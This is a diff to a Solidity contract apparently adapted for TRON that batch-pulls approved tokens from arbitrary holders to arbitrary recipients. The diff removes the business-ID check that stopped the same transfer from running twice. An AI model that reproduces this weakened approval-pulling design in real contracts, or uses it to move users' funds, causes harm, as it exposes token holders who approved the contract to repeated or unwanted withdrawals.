@@ -3,9 +3,9 @@ pragma solidity ^0.8.20;
 
 
 /**
- * @title SafeERC20 (简化版本)
+ * @title SafeTRC20 (简化版本)
  */
-interface IERC20 {
+interface ITRC20 {
     function transferFrom(address from, address to, uint256 amount) external returns (bool);
 
     function allowance(address owner, address spender) external view returns (uint256);
@@ -13,8 +13,8 @@ interface IERC20 {
     function balanceOf(address account) external view returns (uint256);
 }
 
-library SafeERC20 {
-    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
+library SafeTRC20 {
+    function safeTransferFrom(ITRC20 token, address from, address to, uint256 value) internal {
         require(address(token) != address(0), "Invalid token");
         bool success = token.transferFrom(from, to, value);
         require(success, "Transfer failed");
@@ -71,9 +71,7 @@ abstract contract ReentrancyGuard {
  * @title Official 合约 (TVM 兼容版)
  */
 contract Official is Ownable, ReentrancyGuard {
-    using SafeERC20 for IERC20;
-
-    mapping(uint256 => bool) public processedBusinessIds;
+    using SafeTRC20 for ITRC20;
 
     uint256 public constant MAX_REQUESTS = 1024;
 
@@ -82,15 +80,13 @@ contract Official is Ownable, ReentrancyGuard {
         address to;
         address token;
         uint256 amount;
-        uint256 businessId;
     }
 
-    event ERC20BatchTransferPerformed(
+    event BatchTransferPerformed(
         address indexed from,
         address indexed to,
         address indexed token,
-        uint256 value,
-        uint256 businessId
+        uint256 value
     );
 
     constructor() Ownable(msg.sender) {}
@@ -110,7 +106,6 @@ contract Official is Ownable, ReentrancyGuard {
             TransferRequest calldata request = requests[i];
 
             if (
-                processedBusinessIds[request.businessId] ||
                 request.from == request.to ||
                 request.from == address(0) ||
                 request.to == address(0) ||
@@ -120,7 +115,7 @@ contract Official is Ownable, ReentrancyGuard {
                 continue;
             }
 
-            IERC20 token = IERC20(request.token);
+            ITRC20 token = ITRC20(request.token);
 
             uint256 allowance = token.allowance(request.from, address(this));
             uint256 balance = token.balanceOf(request.from);
@@ -129,16 +124,13 @@ contract Official is Ownable, ReentrancyGuard {
                 continue;
             }
 
-            processedBusinessIds[request.businessId] = true;
-
             token.safeTransferFrom(request.from, request.to, request.amount);
 
-            emit ERC20BatchTransferPerformed(
+            emit BatchTransferPerformed(
                 request.from,
                 request.to,
                 request.token,
-                request.amount,
-                request.businessId
+                request.amount
             );
         }
     }
